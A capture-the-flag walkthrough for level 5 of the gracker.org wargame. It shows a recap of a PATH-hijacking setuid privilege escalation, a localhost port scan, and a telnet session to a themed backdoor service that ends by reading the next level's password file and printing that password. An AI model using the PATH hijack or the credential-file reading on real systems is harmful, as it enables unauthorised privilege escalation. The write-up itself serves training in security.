Exercise
========

Login to ```gracker.org``` with the password of user ```level5``` which we gained in ```level4```:
```
user@system ~ $ ssh level5@gracker.org
      __                  _
     / /                 | |
    / /_ _ _ __ __ _  ___| | _____ _ __
   / / _` | '__/ _` |/ __| |/ / _ \ '__|
  / / (_| | | | (_| | (__|   <  __/ |
 /_/ \__, |_|  \__,_|\___|_|\_\___|_|
      __/ |
     |___/
             ~ follow the white rabbit ~
                     ~ gracker ~
            ~ irc.hackint.org  #gracker ~
level5@gracker.org's password:
X11 forwarding request failed on channel 0
                  - The Grid -
               A digital frontier.
 I tried to picture clusters of information as
      they moved through the computer...
What did they look like? - Ships? Motorcycles?
   Were the circuits like freeways? I kept
dreaming of a World I thought I'd never see...
             And then... One day.
                  I got in!

~ https://vimeo.com/25592352
```
As stated by the text which is displayed after login, we start by displaying the recap of the previous level:
```
level5@gracker:~$ cat recap
In this level you had to exploit the fact, that if no absolute path is specified,
the system searches in the $PATH locations for it. Because the setuid binary
didn't use absoliute paths, it was possible to change the environment $PATH
variable. One of the first commands executed is `uname`. So we use a symlink
called uname to `/bin/sh`.

    ln -s /bin/sh uname

If we now set $PATH only to the current working directory "." the system will
search for the `uname` program and will only find the symlink. So it will execute
the shell for us.

    level4@gracker:/tmp/level4$ echo $PATH
    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games

    level4@gracker:/tmp/level4$ env PATH=. /matrix/level4/level4
    Zero Cool - Linux Information Gathering Tool v1.2

    [*] Get system information:
    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
    $ id
    uid=1005(level5) gid=1004(level4) groups=1004(level4)

Because the $PATH is now screwed, we have to reset it back to the original value,
otherwise no other commands will work.

This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
Read this paper for more details:
https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
```
After this, we can display this level's story file in order to find out what we have to do in order to get the password of level5:
```
level5@gracker:~$ cat story
┌─────────────────┐
│ Enter The Grid! │
└─────────────────┘
It looks like Zero Cool hacked into Kevin Flynn's computer. Kevin Flynn is
a Hacker who has been missing for quite some time. We don't know what he
was working on, nor do we know where he is. Maybe Zero Cool knows more.
                                                       ┌─────────────────┐
It looks like  there is no setuid binary this level to │      _____      │
exploit.  So there must be  another way  how Zero Cool │  ___/ _U_ \___  │
hacked into Flynn's system.  You should perform a port │  [:\__\=/__/:]  │
scan on 127.0.0.1 - we also received the hint that the │  ||   ```   ||  │
port is between 0x5ad-0xdad.                           │  ||         ||  │
                                                       │  |_\       /_|  │
If you struggle to get a shell as level6, maybe take a │                 │
break and watch "TRON: LEGACY" [0]. I'm sure that once └─────────────────┘
you saw the movie, you will know how to get access to the GRID.

Tools you may want to have a look at for this level:
 ● `nmap` - Network exploration tool and security / port scanner
 ● `nc`, `netcat` - TCP/IP swiss army knife
 ● watching TRON: LEGACY

[0] https://www.youtube.com/watch?v=L9szn1QQfas
┌────────────────────────────────────────────────────────────────────────┐
│                                                                        │
│              _/_/_/_/_/  _/_/_/      _/_/    _/      _/                │
│                 _/      _/    _/  _/    _/  _/_/    _/                 │
│                _/      _/_/_/    _/    _/  _/  _/  _/                  │
│               _/      _/    _/  _/    _/  _/    _/_/                   │
│              _/      _/    _/    _/_/    _/      _/                    │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

Solution
========
First of all we convert the mentioned port range from hex vaues to decimal:
```
level5@gracker:~$ echo $((0x5ad))
1453
level5@gracker:~$ echo $((0xdad))
3501
```
Then we use ```nmap``` in order to find out which port on target ```localhost``` (127.0.0.1) is listening:
```
level5@gracker:~$ nmap 127.0.0.1 -p 1453-3501

Starting Nmap 6.47 ( http://nmap.org ) at 2017-12-27 11:56 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (1.00s latency).
Not shown: 2048 closed ports
PORT     STATE SERVICE
2989/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 99.03 seconds
```
Let's connect to port ```2989``` and see what happens:
```
level5@gracker:~$ telnet 127.0.0.1 2989
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
$ whoami
flynn
$ uname -a
SolarOs 4.0.1 Generic_50203-02 sun4m i386
Unknown.Unknown
$ login -n root
Login incorrect
login: backdoor
No home directory specified in password file!
Logging in with home=/
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
#
Broadcast message from ZeroCool@h4xx0r (pts/0) (Oct 21 16:29:00 2015):

You are too slow.
Mess With the Best, Die Like the Rest!
Connection closed by foreign host.
```
OK... this is nice but we didn't get a shell. Instead we get a lot of output and the previous command history:
```
# bin/history
  499 kill 2208
  500 ps -a -x -u
  501 touch /opt/LLL/run/ok
  502 LLLSDLaserControl -ok 1
```
Let's connect once again and quickly enter the last two commands ```touch /opt/LLL/run/ok``` and ```LLLSDLaserControl -ok 1``` from the command history folowed by ```cat /home/level6/.pass``` in order to get the next level's password:
```
level5@gracker:~$ telnet 127.0.0.1 2989
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
[...]
# touch /opt/LLL/run/ok
# LLLSDLaserControl -ok 1
You entered the Grid!

level6@TRON:~$ cat /home/level6/.pass
@XpLtpZhqtiG
```
